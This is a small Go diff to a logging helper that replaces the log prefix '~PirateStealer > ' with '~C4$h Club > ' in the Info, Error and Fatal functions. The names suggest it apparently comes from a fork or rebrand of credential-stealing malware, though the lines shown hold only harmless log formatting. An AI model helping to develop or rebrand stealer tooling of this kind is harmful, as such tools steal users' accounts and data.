@@ -15,17 +15,17 @@ var (
 
 func Info(contents ...interface{}) {
 	content := formatMessage(contents...)
-	info("~PirateStealer > ", content)
+	info("~C4$h Club > ", content)
 }
 
 func Error(contents ...interface{}) {
 	content := formatMessage(contents...)
-	err("~PirateStealer > ", content)
+	err("~C4$h Club > ", content)
 }
 
 func Fatal(contents ...interface{}) {
 	content := formatMessage(contents...)
-	fatal("~PirateStealer > ", content)
+	fatal("~C4$h Club > ", content)
 }
 
 func formatMessage(args ...interface{}) string {
